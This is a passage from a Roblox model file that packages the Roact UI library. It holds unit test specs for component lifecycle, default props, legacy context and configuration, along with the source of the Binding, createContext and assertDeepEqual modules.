		local values = didUpdateSpy:captureValues("self", "oldProps", "oldState")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)
		assertDeepEqual(values.oldProps, {})
		assertDeepEqual(values.oldState, initialState)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX6D9E253616A242DDB2A60955BEF53C01">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">shouldUpdate.spec</string>
						<string name="ScriptGuid">{39995459-22D1-430E-8052-8B0277D5DD93}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked when props update", function()
		local MyComponent = Component:extend("MyComponent")

		local capturedProps
		local capturedState
		local shouldUpdateSpy = createSpy(function(self)
			capturedProps = self.props
			capturedState = self.state

			return true
		end)

		MyComponent.shouldUpdate = shouldUpdateSpy.value

		function MyComponent:render()
			return nil
		end

		local initialProps = {
			a = 5,
		}
		local initialElement = createElement(MyComponent, initialProps)
		local hostParent = nil
		local key = "Test"

		local node = noopReconciler.mountVirtualNode(initialElement, hostParent, key)

		expect(shouldUpdateSpy.callCount).to.equal(0)

		local newProps = {
			a = 6,
			b = 2,
		}
		local newElement = createElement(MyComponent, newProps)
		noopReconciler.updateVirtualNode(node, newElement)

		expect(shouldUpdateSpy.callCount).to.equal(1)

		local values = shouldUpdateSpy:captureValues("self", "newProps", "newState")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)

		assertDeepEqual(values.newProps, newProps)

		assertDeepEqual(capturedProps, initialProps)

		expect(values.newState).to.equal(capturedState)
		assertDeepEqual(capturedState, {})
	end)

	it("should be invoked when state is updated", function()
		local MyComponent = Component:extend("MyComponent")

		local initialState = {
			a = 1,
		}

		local setState
		local initState
		function MyComponent:init()
			setState = function(...)
				return self:setState(...)
			end

			self:setState(initialState)

			initState = self.state
		end

		local capturedProps
		local capturedState
		local shouldUpdateSpy = createSpy(function(self)
			capturedProps = self.props
			capturedState = self.state

			return true
		end)

		MyComponent.shouldUpdate = shouldUpdateSpy.value

		function MyComponent:render()
			return nil
		end

		local initialElement = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		noopReconciler.mountVirtualNode(initialElement, hostParent, key)

		expect(shouldUpdateSpy.callCount).to.equal(0)

		local newState = {
			a = 2,
			b = 3,
		}

		setState(newState)

		expect(shouldUpdateSpy.callCount).to.equal(1)

		local values = shouldUpdateSpy:captureValues("self", "newProps", "newState")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)

		expect(values.newProps).to.equal(capturedProps)
		assertDeepEqual(capturedProps, {})

		assertDeepEqual(capturedState, initialState)
		expect(capturedState).to.equal(initState)
		assertDeepEqual(values.newState, newState)
	end)

	it("should not abort an update when returning true", function()
		local MyComponent = Component:extend("MyComponent")

		function MyComponent:shouldUpdate()
			return true
		end

		local renderSpy = createSpy()

		MyComponent.render = renderSpy.value

		local initialElement = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		local node = noopReconciler.mountVirtualNode(initialElement, hostParent, key)

		expect(renderSpy.callCount).to.equal(1)

		local newElement = createElement(MyComponent)
		noopReconciler.updateVirtualNode(node, newElement)

		expect(renderSpy.callCount).to.equal(2)
	end)

	it("should abort an update when retuning false", function()
		local MyComponent = Component:extend("MyComponent")

		function MyComponent:shouldUpdate()
			return false
		end

		local renderSpy = createSpy()

		MyComponent.render = renderSpy.value

		local initialElement = createElement(MyComponent)
		local hostParent = nil
		local key = "Test"

		local node = noopReconciler.mountVirtualNode(initialElement, hostParent, key)

		expect(renderSpy.callCount).to.equal(1)

		local newElement = createElement(MyComponent)
		noopReconciler.updateVirtualNode(node, newElement)

		expect(renderSpy.callCount).to.equal(1)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX92CCB2B28FD540A89E021767653C047B">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">defaultProps.spec</string>
						<string name="ScriptGuid">{0C59DEAE-F652-43B1-8C35-349AB81FBE60}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local None = require(script.Parent.Parent.None)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should fill in when mounting before init", function()
		local defaultProps = {
			a = 3,
			b = 2,
		}

		local Foo = Component:extend("Foo")

		Foo.defaultProps = defaultProps

		local capturedProps
		function Foo:init()
			capturedProps = self.props
		end

		function Foo:render()
		end

		local initialProps = {
			b = 4,
			c = 6,
		}

		local element = createElement(Foo, initialProps)
		local hostParent = nil
		local key = "Some Foo"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		local expectedProps = {
			a = defaultProps.a,
			b = initialProps.b,
			c = initialProps.c,
		}

		assertDeepEqual(capturedProps, expectedProps)
	end)

	it("should fill in when updating via props", function()
		local defaultProps = {
			a = 3,
			b = 2,
		}

		local Foo = Component:extend("Foo")

		Foo.defaultProps = defaultProps

		local capturedProps
		function Foo:render()
			capturedProps = self.props
		end

		local initialProps = {
			b = 4,
			c = 6,
		}

		local element = createElement(Foo, initialProps)
		local hostParent = nil
		local key = "Some Foo"

		local node = noopReconciler.mountVirtualNode(element, hostParent, key)

		local updatedProps = {
			c = 5,
		}
		local updatedElement = createElement(Foo, updatedProps)

		noopReconciler.updateVirtualNode(node, updatedElement)

		local expectedProps = {
			a = defaultProps.a,
			b = defaultProps.b,
			c = updatedProps.c,
		}

		assertDeepEqual(capturedProps, expectedProps)
	end)

	it("should respect None to override a default prop with nil", function()
		local defaultProps = {
			a = 3,
			b = 2,
		}

		local Foo = Component:extend("Foo")

		Foo.defaultProps = defaultProps

		local capturedProps
		function Foo:render()
			capturedProps = self.props
		end

		local initialProps = {
			b = None,
			c = 4,
		}

		local element = createElement(Foo, initialProps)
		local hostParent = nil
		local key = "Some Foo"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		local expectedProps = {
			a = defaultProps.a,
			b = nil,
			c = initialProps.c,
		}

		assertDeepEqual(capturedProps, expectedProps)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX0B0F0D31920B436787E47200356C7E5A">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">legacyContext.spec</string>
						<string name="ScriptGuid">{4DC89965-AB62-4FFE-8E3E-0E3A8D9E0025}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be provided as a mutable self._context in Component:init", function()
		local Provider = Component:extend("Provider")

		function Provider:init()
			self._context.foo = "bar"
		end

		function Provider:render()
		end

		local element = createElement(Provider)
		local hostParent = nil
		local hostKey = "Provider"
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		local expectedContext = {
			foo = "bar",
		}

		assertDeepEqual(node.legacyContext, expectedContext)
	end)

	it("should be inherited from parent stateful nodes", function()
		local Consumer = Component:extend("Consumer")

		local capturedContext
		function Consumer:init()
			capturedContext = self._context
		end

		function Consumer:render()
		end

		local Parent = Component:extend("Parent")

		function Parent:render()
			return createElement(Consumer)
		end

		local element = createElement(Parent)
		local hostParent = nil
		local hostKey = "Parent"
		local context = {
			hello = "world",
			value = 6,
		}
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey, nil, context)

		expect(capturedContext).never.to.equal(context)
		expect(capturedContext).never.to.equal(node.legacyContext)
		assertDeepEqual(node.legacyContext, context)
		assertDeepEqual(capturedContext, context)
	end)

	it("should be inherited from parent function nodes", function()
		local Consumer = Component:extend("Consumer")

		local capturedContext
		function Consumer:init()
			capturedContext = self._context
		end

		function Consumer:render()
		end

		local function Parent()
			return createElement(Consumer)
		end

		local element = createElement(Parent)
		local hostParent = nil
		local hostKey = "Parent"
		local context = {
			hello = "world",
			value = 6,
		}
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey, nil, context)

		expect(capturedContext).never.to.equal(context)
		expect(capturedContext).never.to.equal(node.legacyContext)
		assertDeepEqual(node.legacyContext, context)
		assertDeepEqual(capturedContext, context)
	end)

	it("should contain values put into the tree by parent nodes", function()
		local Consumer = Component:extend("Consumer")

		local capturedContext
		function Consumer:init()
			capturedContext = self._context
		end

		function Consumer:render()
		end

		local Provider = Component:extend("Provider")

		function Provider:init()
			self._context.frob = "ulator"
		end

		function Provider:render()
			return createElement(Consumer)
		end

		local element = createElement(Provider)
		local hostParent = nil
		local hostKey = "Consumer"
		local context = {
			dont = "try it",
		}
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey, nil, context)

		local initialContext = {
			dont = "try it",
		}

		local expectedContext = {
			dont = "try it",
			frob = "ulator",
		}

		-- Because components mutate context, we're careful with equality
		expect(node.legacyContext).never.to.equal(context)
		expect(capturedContext).never.to.equal(context)
		expect(capturedContext).never.to.equal(node.legacyContext)

		assertDeepEqual(context, initialContext)
		assertDeepEqual(node.legacyContext, expectedContext)
		assertDeepEqual(capturedContext, expectedContext)
	end)

	it("should transfer context to children that are replaced", function()
		local ConsumerA = Component:extend("ConsumerA")

		local capturedContextA
		function ConsumerA:init()
			self._context.A = "hello"

			capturedContextA = self._context
		end

		function ConsumerA:render()
		end

		local ConsumerB = Component:extend("ConsumerB")

		local capturedContextB
		function ConsumerB:init()
			self._context.B = "hello"

			capturedContextB = self._context
		end

		function ConsumerB:render()
		end

		local Provider = Component:extend("Provider")

		function Provider:init()
			self._context.frob = "ulator"
		end

		function Provider:render()
			local useConsumerB = self.props.useConsumerB

			if useConsumerB then
				return createElement(ConsumerB)
			else
				return createElement(ConsumerA)
			end
		end

		local hostParent = nil
		local hostKey = "Consumer"

		local element = createElement(Provider)
		local node = noopReconciler.mountVirtualNode(element, hostParent, hostKey)

		local expectedContextA = {
			frob = "ulator",
			A = "hello",
		}

		assertDeepEqual(capturedContextA, expectedContextA)

		local expectedContextB = {
			frob = "ulator",
			B = "hello",
		}

		local replacedElement = createElement(Provider, {
			useConsumerB = true,
		})
		noopReconciler.updateVirtualNode(node, replacedElement)

		assertDeepEqual(capturedContextB, expectedContextB)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX2C3565B1E1184BDBA5D808D035F18029">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">init.spec</string>
						<string name="ScriptGuid">{159E15ED-876E-4E3B-9CD4-DD83B5271920}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local assertDeepEqual = require(script.Parent.Parent.assertDeepEqual)
	local createElement = require(script.Parent.Parent.createElement)
	local createReconciler = require(script.Parent.Parent.createReconciler)
	local createSpy = require(script.Parent.Parent.createSpy)
	local NoopRenderer = require(script.Parent.Parent.NoopRenderer)
	local Type = require(script.Parent.Parent.Type)

	local Component = require(script.Parent.Parent.Component)

	local noopReconciler = createReconciler(NoopRenderer)

	it("should be invoked with props when mounted", function()
		local MyComponent = Component:extend("MyComponent")

		local initSpy = createSpy()

		MyComponent.init = initSpy.value

		function MyComponent:render()
			return nil
		end

		local props = {
			a = 5,
		}
		local element = createElement(MyComponent, props)
		local hostParent = nil
		local key = "Some Component Key"

		noopReconciler.mountVirtualNode(element, hostParent, key)

		expect(initSpy.callCount).to.equal(1)

		local values = initSpy:captureValues("self", "props")

		expect(Type.of(values.self)).to.equal(Type.StatefulComponentInstance)
		expect(typeof(values.props)).to.equal("table")
		assertDeepEqual(values.props, props)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
			</Item>
			<Item class="ModuleScript" referent="RBXB423C022564045C6A9DDB0BB1D1AFB74">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Config.spec</string>
					<string name="ScriptGuid">{CFE81567-41C0-42EF-8175-F46D2F6E45A7}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Config = require(script.Parent.Config)

	it("should accept valid configuration", function()
		local config = Config.new()
		local values = config.get()

		expect(values.elementTracing).to.equal(false)

		config.set({
			elementTracing = true,
		})

		expect(values.elementTracing).to.equal(true)
	end)

	it("should reject invalid configuration keys", function()
		local config = Config.new()

		local badKey = "garblegoop"

		local ok, err = pcall(function()
			config.set({
				[badKey] = true,
			})
		end)

		expect(ok).to.equal(false)

		-- The error should mention our bad key somewhere.
		expect(err:find(badKey)).to.be.ok()
	end)

	it("should reject invalid configuration values", function()
		local config = Config.new()

		local goodKey = "elementTracing"
		local badValue = "Hello there!"

		local ok, err = pcall(function()
			config.set({
				[goodKey] = badValue,
			})
		end)

		expect(ok).to.equal(false)

		-- The error should mention both our key and value
		expect(err:find(goodKey)).to.be.ok()
		expect(err:find(badValue)).to.be.ok()
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX80C7A2AA01DE42EBB2ECAAF44573D117">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Binding</string>
					<string name="ScriptGuid">{94D7F2AC-5380-4177-8F7C-EC0E4ABD07D8}</string>
					<ProtectedString name="Source"><![CDATA[local createSignal = require(script.Parent.createSignal)
local Symbol = require(script.Parent.Symbol)
local Type = require(script.Parent.Type)

local config = require(script.Parent.GlobalConfig).get()

local BindingImpl = Symbol.named("BindingImpl")

local BindingInternalApi = {}

local bindingPrototype = {}

function bindingPrototype:getValue()
	return BindingInternalApi.getValue(self)
end

function bindingPrototype:map(predicate)
	return BindingInternalApi.map(self, predicate)
end

local BindingPublicMeta = {
	__index = bindingPrototype,
	__tostring = function(self)
		return string.format("RoactBinding(%s)", tostring(self:getValue()))
	end,
}

function BindingInternalApi.update(binding, newValue)
	return binding[BindingImpl].update(newValue)
end

function BindingInternalApi.subscribe(binding, callback)
	return binding[BindingImpl].subscribe(callback)
end

function BindingInternalApi.getValue(binding)
	return binding[BindingImpl].getValue()
end

function BindingInternalApi.create(initialValue)
	local impl = {
		value = initialValue,
		changeSignal = createSignal(),
	}

	function impl.subscribe(callback)
		return impl.changeSignal:subscribe(callback)
	end

	function impl.update(newValue)
		impl.value = newValue
		impl.changeSignal:fire(newValue)
	end

	function impl.getValue()
		return impl.value
	end

	return setmetatable({
		[Type] = Type.Binding,
		[BindingImpl] = impl,
	}, BindingPublicMeta), impl.update
end

function BindingInternalApi.map(upstreamBinding, predicate)
	if config.typeChecks then
		assert(Type.of(upstreamBinding) == Type.Binding, "Expected arg #1 to be a binding")
		assert(typeof(predicate) == "function", "Expected arg #1 to be a function")
	end

	local impl = {}

	function impl.subscribe(callback)
		return BindingInternalApi.subscribe(upstreamBinding, function(newValue)
			callback(predicate(newValue))
		end)
	end

	function impl.update(newValue)
		error("Bindings created by Binding:map(fn) cannot be updated directly", 2)
	end

	function impl.getValue()
		return predicate(upstreamBinding:getValue())
	end

	return setmetatable({
		[Type] = Type.Binding,
		[BindingImpl] = impl,
	}, BindingPublicMeta)
end

function BindingInternalApi.join(upstreamBindings)
	if config.typeChecks then
		assert(typeof(upstreamBindings) == "table", "Expected arg #1 to be of type table")

		for key, value in pairs(upstreamBindings) do
			if Type.of(value) ~= Type.Binding then
				local message = (
					"Expected arg #1 to contain only bindings, but key %q had a non-binding value"
				):format(
					tostring(key)
				)
				error(message, 2)
			end
		end
	end

	local impl = {}

	local function getValue()
		local value = {}

		for key, upstream in pairs(upstreamBindings) do
			value[key] = upstream:getValue()
		end

		return value
	end

	function impl.subscribe(callback)
		local disconnects = {}

		for key, upstream in pairs(upstreamBindings) do
			disconnects[key] = BindingInternalApi.subscribe(upstream, function(newValue)
				callback(getValue())
			end)
		end

		return function()
			if disconnects == nil then
				return
			end

			for _, disconnect in pairs(disconnects) do
				disconnect()
			end

			disconnects = nil
		end
	end

	function impl.update(newValue)
		error("Bindings created by joinBindings(...) cannot be updated directly", 2)
	end

	function impl.getValue()
		return getValue()
	end

	return setmetatable({
		[Type] = Type.Binding,
		[BindingImpl] = impl,
	}, BindingPublicMeta)
end

return BindingInternalApi]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXEB403C18F2DD4CA081F36E187D1E2F6C">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createElement.spec</string>
					<string name="ScriptGuid">{73A245D2-33AF-4DD5-BAEA-A81210481E68}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local Component = require(script.Parent.Component)
	local ElementKind = require(script.Parent.ElementKind)
	local GlobalConfig = require(script.Parent.GlobalConfig)
	local Logging = require(script.Parent.Logging)
	local Type = require(script.Parent.Type)
	local Portal = require(script.Parent.Portal)
	local Children = require(script.Parent.PropMarkers.Children)

	local createElement = require(script.Parent.createElement)

	it("should create new primitive elements", function()
		local element = createElement("Frame")

		expect(element).to.be.ok()
		expect(Type.of(element)).to.equal(Type.Element)
		expect(ElementKind.of(element)).to.equal(ElementKind.Host)
	end)

	it("should create new functional elements", function()
		local element = createElement(function()
		end)

		expect(element).to.be.ok()
		expect(Type.of(element)).to.equal(Type.Element)
		expect(ElementKind.of(element)).to.equal(ElementKind.Function)
	end)

	it("should create new stateful components", function()
		local Foo = Component:extend("Foo")

		local element = createElement(Foo)

		expect(element).to.be.ok()
		expect(Type.of(element)).to.equal(Type.Element)
		expect(ElementKind.of(element)).to.equal(ElementKind.Stateful)
	end)

	it("should create new portal elements", function()
		local element = createElement(Portal)

		expect(element).to.be.ok()
		expect(Type.of(element)).to.equal(Type.Element)
		expect(ElementKind.of(element)).to.equal(ElementKind.Portal)
	end)

	it("should accept props", function()
		local element = createElement("StringValue", {
			Value = "Foo",
		})

		expect(element).to.be.ok()
		expect(element.props.Value).to.equal("Foo")
	end)

	it("should accept props and children", function()
		local child = createElement("IntValue")

		local element = createElement("StringValue", {
			Value = "Foo",
		}, {
			Child = child,
		})

		expect(element).to.be.ok()
		expect(element.props.Value).to.equal("Foo")
		expect(element.props[Children]).to.be.ok()
		expect(element.props[Children].Child).to.equal(child)
	end)

	it("should accept children with without props", function()
		local child = createElement("IntValue")

		local element = createElement("StringValue", nil, {
			Child = child,
		})

		expect(element).to.be.ok()
		expect(element.props[Children]).to.be.ok()
		expect(element.props[Children].Child).to.equal(child)
	end)

	it("should warn once if children is specified in two different ways", function()
		local logInfo = Logging.capture(function()
			-- Using a loop here to ensure that multiple occurences of the same
			-- warning only cause output once.
			for _ = 1, 2 do
				createElement("Frame", {
					[Children] = {},
				}, {})
			end
		end)

		expect(#logInfo.warnings).to.equal(1)
		expect(logInfo.warnings[1]:find("createElement")).to.be.ok()
		expect(logInfo.warnings[1]:find("Children")).to.be.ok()
	end)

	it("should have a `source` member if elementTracing is set", function()
		local config = {
			elementTracing = true,
		}

		GlobalConfig.scoped(config, function()
			local element = createElement("StringValue")

			expect(element.source).to.be.a("string")
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX2CAFFAE91EA34B69AE5B726796343A4F">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">createContext</string>
					<string name="ScriptGuid">{22B368CF-390C-43C5-9F71-F5FE3ED90AAE}</string>
					<ProtectedString name="Source"><![CDATA[local Symbol = require(script.Parent.Symbol)
local createFragment = require(script.Parent.createFragment)
local createSignal = require(script.Parent.createSignal)
local Children = require(script.Parent.PropMarkers.Children)
local Component = require(script.Parent.Component)

--[[
	Construct the value that is assigned to Roact's context storage.
]]
local function createContextEntry(currentValue)
	return {
		value = currentValue,
		onUpdate = createSignal(),
	}
end

local function createProvider(context)
	local Provider = Component:extend("Provider")

	function Provider:init(props)
		self.contextEntry = createContextEntry(props.value)
		self:__addContext(context.key, self.contextEntry)
	end

	function Provider:willUpdate(nextProps)
		-- If the provided value changed, immediately update the context entry.
		--
		-- During this update, any components that are reachable will receive
		-- this updated value at the same time as any props and state updates
		-- that are being applied.
		if nextProps.value ~= self.props.value then
			self.contextEntry.value = nextProps.value
		end
	end

	function Provider:didUpdate(prevProps)
		-- If the provided value changed, after we've updated every reachable
		-- component, fire a signal to update the rest.
		--
		-- This signal will notify all context consumers. It's expected that
		-- they will compare the last context value they updated with and only
		-- trigger an update on themselves if this value is different.
		--
		-- This codepath will generally only update consumer components that has
		-- a component implementing shouldUpdate between them and the provider.
		if prevProps.value ~= self.props.value then
			self.contextEntry.onUpdate:fire(self.props.value)
		end
	end

	function Provider:render()
		return createFragment(self.props[Children])
	end

	return Provider
end

local function createConsumer(context)
	local Consumer = Component:extend("Consumer")

	function Consumer.validateProps(props)
		if type(props.render) ~= "function" then
			return false, "Consumer expects a `render` function"
		else
			return true
		end
	end

	function Consumer:init(props)
		-- This value may be nil, which indicates that our consumer is not a
		-- descendant of a provider for this context item.
		self.contextEntry = self:__getContext(context.key)
	end

	function Consumer:render()
		-- Render using the latest available for this context item.
		--
		-- We don't store this value in state in order to have more fine-grained
		-- control over our update behavior.
		local value
		if self.contextEntry ~= nil then
			value = self.contextEntry.value
		else
			value = context.defaultValue
		end

		return self.props.render(value)
	end

	function Consumer:didUpdate()
		-- Store the value that we most recently updated with.
		--
		-- This value is compared in the contextEntry onUpdate hook below.
		if self.contextEntry ~= nil then
			self.lastValue = self.contextEntry.value
		end
	end

	function Consumer:didMount()
		if self.contextEntry ~= nil then
			-- When onUpdate is fired, a new value has been made available in
			-- this context entry, but we may have already updated in the same
			-- update cycle.
			--
			-- To avoid sending a redundant update, we compare the new value
			-- with the last value that we updated with (set in didUpdate) and
			-- only update if they differ. This may happen when an update from a
			-- provider was blocked by an intermediate component that returned
			-- false from shouldUpdate.
			self.disconnect = self.contextEntry.onUpdate:subscribe(function(newValue)
				if newValue ~= self.lastValue then
					-- Trigger a dummy state update.
					self:setState({})
				end
			end)
		end
	end

	function Consumer:willUnmount()
		if self.disconnect ~= nil then
			self.disconnect()
		end
	end

	return Consumer
end

local Context = {}
Context.__index = Context

function Context.new(defaultValue)
	return setmetatable({
		defaultValue = defaultValue,
		key = Symbol.named("ContextKey"),
	}, Context)
end

function Context:__tostring()
	return "RoactContext"
end

local function createContext(defaultValue)
	local context = Context.new(defaultValue)

	return {
		Provider = createProvider(context),
		Consumer = createConsumer(context),
	}
end

return createContext
]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXCCC0FBB5C0874617816E02F92CE1B2DA">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">strict.spec</string>
					<string name="ScriptGuid">{89193EA0-EEDC-4FFB-B8BD-B800D7E2DC2F}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local strict = require(script.Parent.strict)

	it("should error when getting a nonexistent key", function()
		local t = strict({
			a = 1,
			b = 2,
		})

		expect(function()
			return t.c
		end).to.throw()
	end)

	it("should error when setting a nonexistent key", function()
		local t = strict({
			a = 1,
			b = 2,
		})

		expect(function()
			t.c = 3
		end).to.throw()
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXF32966F91AFB4769B5738B6BEBF50C83">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">assertDeepEqual</string>
					<string name="ScriptGuid">{E151D0FC-CAB3-4C3A-AFDF-499643B260F1}</string>
					<ProtectedString name="Source"><![CDATA[--[[
	A utility used to assert that two objects are value-equal recursively. It
	outputs fairly nicely formatted messages to help diagnose why two objects
	would be different.

	This should only be used in tests.
]]

local function deepEqual(a, b)
	if typeof(a) ~= typeof(b) then
		local message = ("{1} is of type %s, but {2} is of type %s"):format(
			typeof(a),
			typeof(b)
		)
		return false, message
	end

	if typeof(a) == "table" then
		local visitedKeys = {}

		for key, value in pairs(a) do
			visitedKeys[key] = true

			local success, innerMessage = deepEqual(value, b[key])
			if not success then
				local message = innerMessage
					:gsub("{1}", ("{1}[%s]"):format(tostring(key)))
					:gsub("{2}", ("{2}[%s]"):format(tostring(key)))

				return false, message
			end
		end

		for key, value in pairs(b) do
			if not visitedKeys[key] then
				local success, innerMessage = deepEqual(value, a[key])

				if not success then
					local message = innerMessage
						:gsub("{1}", ("{1}[%s]"):format(tostring(key)))
						:gsub("{2}", ("{2}[%s]"):format(tostring(key)))

					return false, message
				end
			end
		end

		return true
	end

	if a == b then
		return true
	end

	local message = "{1} ~= {2}"
	return false, message
end

local function assertDeepEqual(a, b)
	local success, innerMessageTemplate = deepEqual(a, b)

	if not success then
		local innerMessage = innerMessageTemplate
			:gsub("{1}", "first")
			:gsub("{2}", "second")

		local message = ("Values were not deep-equal.\n%s"):format(innerMessage)

		error(message, 2)
	end
end

return assertDeepEqual]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBXAED2CC02B7CE4BE1A286FE20253AD598">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">GlobalConfig.spec</string>
					<string name="ScriptGuid">{5EBBE44E-B314-43BE-85D7-4DAEE87D1BD8}</string>
					<ProtectedString name="Source"><![CDATA[return function()
	local GlobalConfig = require(script.Parent.GlobalConfig)

	it("should have the correct methods", function()
		expect(GlobalConfig).to.be.ok()
		expect(GlobalConfig.set).to.be.ok()
		expect(GlobalConfig.get).to.be.ok()
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="Folder" referent="RBXD1294EA63D0742299002DB2F201CA900">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<string name="Name">PropMarkers</string>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
				<Item class="ModuleScript" referent="RBXD2F11E114BB749A3B724E26305BABCA7">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Event.spec</string>
						<string name="ScriptGuid">{837CEA7A-68EE-4D68-A595-E1E184ED1EFE}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local Type = require(script.Parent.Parent.Type)

	local Event = require(script.Parent.Event)

	it("should yield event objects when indexed", function()
		expect(Type.of(Event.MouseButton1Click)).to.equal(Type.HostEvent)
		expect(Type.of(Event.Touched)).to.equal(Type.HostEvent)
	end)

	it("should yield the same object when indexed again", function()
		local a = Event.MouseButton1Click
		local b = Event.MouseButton1Click
		local c = Event.Touched

		expect(a).to.equal(b)
		expect(a).never.to.equal(c)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
				<Item class="ModuleScript" referent="RBX0ADB0434680A40018710A38A7A9B78A9">
					<Properties>
						<BinaryString name="AttributesSerialize"></BinaryString>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Change.spec</string>
						<string name="ScriptGuid">{E4974BC6-3C77-49EC-BB1A-B81D94A6A979}</string>
						<ProtectedString name="Source"><![CDATA[return function()
	local Type = require(script.Parent.Parent.Type)

	local Change = require(script.Parent.Change)

	it("should yield change listener objects when indexed", function()
		expect(Type.of(Change.Text)).to.equal(Type.HostChangeEvent)
		expect(Type.of(Change.Selected)).to.equal(Type.HostChangeEvent)
	end)

	it("should yield the same object when indexed again", function()
		local a = Change.Text
		local b = Change.Text
		local c = Change.Selected

		expect(a).to.equal(b)
		expect(a).never.to.equal(c)
	end)
end]]></ProtectedString>
						<int64 name="SourceAssetId">-1</int64>
						<BinaryString name="Tags"></BinaryString>
					</Properties>
				</Item>
